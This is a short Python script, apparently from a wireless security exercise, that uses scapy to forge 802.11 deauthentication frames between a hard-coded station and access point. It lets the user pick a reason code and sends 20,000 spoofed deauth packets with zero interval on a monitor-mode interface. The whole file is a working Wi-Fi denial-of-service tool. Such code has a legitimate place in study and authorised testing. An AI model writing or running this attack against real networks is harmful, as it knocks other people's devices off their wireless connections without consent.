#! /usr/bin/env python

from scapy.all import *

# change the STA and AP mac addresses that you want to target

# station mac address
sta_mac = "04:ed:33:c1:53:ea"
# access point mac address
ap_mac = "AA:DB:03:E0:AF:A7"

# input validity check
invalid = True

input_reason = 1

# ask user for reason code
while invalid:

	print("Please enter one of the reason codes below:")
	print("1 - Unspecified")
	print("4 - Disassociated due to inactivity")
	print("5 - Disassociated because AP is unable to handle all currently associated stations")
	print("8 - Deauthenticated because sending STA is leaving BSS")

	# user input
	input_reason = raw_input("Reason : ")

	if not input_reason.isdigit():
		continue

	input_reason = int(input_reason)	

	if input_reason == 1 or input_reason == 8:
		# send to AP (We chose to put 1 here, could be in the other case.)
		src = sta_mac
		dest = ap_mac
		invalid = False
	elif input_reason == 4 or input_reason == 5:
		# semd tp STA
		src = ap_mac
		dest = sta_mac
		invalid = False
	else:
		print("Invalid input.")

# 802.11
dot11 = Dot11(addr1 = dest, addr2 = src, addr3 = ap_mac)

# preparing packet to send with user's reason code
packet = RadioTap()/dot11/Dot11Deauth(reason = input_reason)

# send 20'000 deauth packets with interval 0 on interface iface
sendp(packet, inter = 0, count = 20000, iface = "wlan0mon", verbose = 1)
